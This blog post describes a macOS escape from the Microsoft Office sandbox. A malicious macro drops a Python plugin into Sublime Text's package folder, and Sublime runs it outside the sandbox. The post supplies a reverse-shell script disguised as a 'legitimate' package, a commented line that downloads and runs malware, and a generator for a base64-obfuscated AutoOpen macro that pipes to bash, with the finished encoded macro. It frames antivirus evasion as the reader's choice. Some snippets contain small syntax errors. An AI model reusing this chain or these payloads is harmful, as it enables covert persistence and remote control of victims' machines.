---
title: "A Sublime Office Sandbox Bypass"
date: 2020-10-21T19:44:32-07:00
---

If an unwitting user runs a malicious macro-enabled document on a macOS system that has Sublime Text installed, an attacker can seamlessly escape the Office sandbox.

In effect
1. The MS Office sandbox allows writing files to arbitrary locations as long as they begin with `~$`, with some exceptions
2. The Sublime Text editor automatically loads (outside the sandbox) Python plugins from a user writable file path

After reading Patrick Wardle's [Office Drama on macOS](https://objective-see.com/blog/blog_0x4B.html) which outlined a persistence method leveraging a sandbox escaped discovered by Adam Chester (see [Escaping the Microsoft Office Sandbox](https://objective-see.com/blog/blog_0x35.html)), I did some rudimentary experimenting. Recent patches have precluded directly writing to `LaunchAgents` or `Application Scripts` but files can still be written to other user writable paths as long as they start with `~$`.

There are likely a plethora of creative options but having Sublime Text installed I found a nice option for escaping the Office sandbox. Feel free to skip to the end if you're not interested in the Sublime Plugin aspect.

I'm certainly not the first to leverage Sublime for persistence. Prior art by [theevilbit](https://theevilbit.github.io/posts/macos_persisting_through-application_script_files/) is worth a quick read and that post goes into persisting in Python imports and others applications. Leo Pitt also outlined its usage with JXA and Apfell [here](https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5). That post also covers some good detection method as well.

## Sublime Text Packages
Sublime leverages Python for its plugin ecosystem. If you have the permissions to edit files in `C:\Program Files\`, you can simply edit `sublime.py` or `sublime_plugin.py` for your persistence needs. When Sublime next starts, your code will run. If Sublime is already running, you can call `c:\Program Files\Sublime Text 3\subl.exe <sublime pid>` and it will reload those files.

But maybe you can't write to `C:\Program Files` or want to keep things a bit more covert. If you can write to `%APPDATA%\Sublime Text 3\Packages\` or `$HOME/Library/Application Support/Sublime Text 3/Packages/` you can create a plugin to help you out.

In the Packages directory, create a file `package-control.py` or other innocuously named file. It can be any Python code, but if you want to play nice with Sublime, the following template will work.
```python
import sublime, sublime_plugin, os;

def plugin_loaded():
  os.system('open -a /Applications/Calculator.app')
```
This creates and automatically loads the new plugin. Newer versions appear to execute the plugin the moment it's saved but older versions may need reloaded with `subl` or `subl.exe` commands with the `-b` option to run in the background.

### Creating Binary Packages
If you would like to keep your Python persistence one level beyond prying eyes, create a `.sublime-package` file, which is basically a zip file of python bytecode. [Package Control](https://packagecontrol.io/) is the package manager for Sublime Text and will do this for you. To create a new package, first Install Package Control: `Cmd + Shift + P` > `Install Package Control`.

Package Control expects a folder under Packages so create that first.

`mkdir ~/Library/Application Support/Sublime Text 3/Packages/legitimate`

Then add your benign python code to that folder.

```bash
cat > ~/Library/Application Support/Sublime Text 3/Packages/legitimate.py << EOF
import socket, subprocess, os;
s=socket.socket(socket.AF_INET,so.SOCK_STREAM);
s.connect(("172.16.1.1",8080));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);');
EOF
```
Now in Sublime Text, `Ctrl + Shift + P` > Create Package > legitimate > Default

And your new package file will be at `~/Desktop/test.sublime-package`. 

This file can now be copied to `~/Library/Application Support/Sublime Text 3/Installed Packages/` or `%APPDATA%\Sublime Text 3\Installed Packages\` where Sublime will automatically pick it up and run your code.

> Note: I did run into some issues with Package Control not compiling my code on macOS, but manually compiling before creating the package seemed to get things working.
> ```bash
> % cd ~/Library/Application Support/Sublime Text 3/Packages
> % python -m compileall legitimate.py
> % rm legitimate.py #YMMV
> ```

## Macros
So how do we leverage all that to seamlessly escape the Office sandbox? The following code snippet is sufficient to have Sublime execute Python of our choosing outside the sandbox. Or rather than the code snippet, copy the binary sublime-package file to the `Installed Packages` to provide some obfuscation.

```python
import os

forsublime = '''
import os
os.system('open -a /Applications/Calculator.app')
#os.system('curl example.com/malware' && chmod +x malware && ./malware')
'''

# the above is saved to the Office sandbox
with open('legitimatefile.txt', 'w') as f:
	f.write(forsublime)

# and we copy it to Sublime's plugin folder
os.system("cp legitimatefile.txt /Users/$USER/Library/Application Support/Sublime Text 3/Installed Packages/~\$legitimate_plugin.sublime-package")

# if Sublime isn't running, help the user out
os.system("open -a /Application/Sublime Text.app")
```

And the following helper function makes it easy to drop that into a macro.

```python
import base64

e = base64.b64encode(abovepythoncode)
p = "echo \"import base64, exec(base64.b64decode('{}'));\" | /usr/bin/python &".format(e)
out = base64.b64encode(p)
n = 42
macro = []

for i in range(0,len(out), n):
    if i == 0:
        macro.append("str = \"%s\"" % out[i:i+n])
    else:
        macro.append("str = str + \"%s\"" % out[i:i+n])

print('''Sub AutoOpen()
Dim Str
{}
MacScript "do shell script \\""echo" & Str & "\\"" | /usr/bin/base64 -D | /bin/bash"" "
End Sub
''').format("\n".join(macro))

```

Leaving you with something like the following. AV and EDR avoidance obviously up to you.
```
Sub AutoOpen()
Dim Str
str = "ZWNobyAiaW1wb3J0IGJhc2U2NCwgZXhlYyhiYXNlNj"
str = str + "QuYjY0ZGVjb2RlKCdhVzF3YjNKMElHOXpDbVp2Y25O"
str = str + "MVlteHBiV1VnUFNBbkp5Y0thVzF3YjNKMElHOXpDbT"
str = str + "l6TG5ONWMzUmxiU2duYjNCbGJpQXRZU0F2UVhCd2JH"
str = str + "bGpZWFJwYjI1ekwwTmhiR04xYkdGMGIzSXVZWEJ3Sn"
str = str + "lrS0p5Y25DbmRwZEdnZ2IzQmxiaWduYkdWbmFYUnBi"
str = str + "V0YwWldacGJHVXVkSGgwSnl3Z0ozY25LU0JoY3lCbU"
str = str + "9nb2dJQ0FnSUNBZ0lHWXVkM0pwZEdVb1ptOXljM1Zp"
str = str + "YkdsdFpTa0tDbTl6TG5ONWMzUmxiU2dpWTNBZ2JHVm"
str = str + "5hWFJwYldGMFpXWnBiR1V1ZEhoMElDOVZjMlZ5Y3k4"
str = str + "a1ZWTkZVaTlNYVdKeVlYSjVMMEZ3Y0d4cFkyRjBhVz"
str = str + "l1SUZOMWNIQnZjblF2VTNWaWJHbHRaU0JVWlhoMElE"
str = str + "TXZTVzV6ZEdGc2JHVmtJRkJoWTJ0aFoyVnpMMzVjSk"
str = str + "d4bFoybDBhVzFoZEdWZmNHeDFaMmx1TG5OMVlteHBi"
str = str + "V1V0Y0dGamEyRm5aU0lwQ2c9PScpKTsiIHwgL3Vzci"
str = str + "9iaW4vcHl0aG9uICY="
MacScript "do shell script \""echo" & Str & "\""|base64 -D|bash"" "
End Sub
```
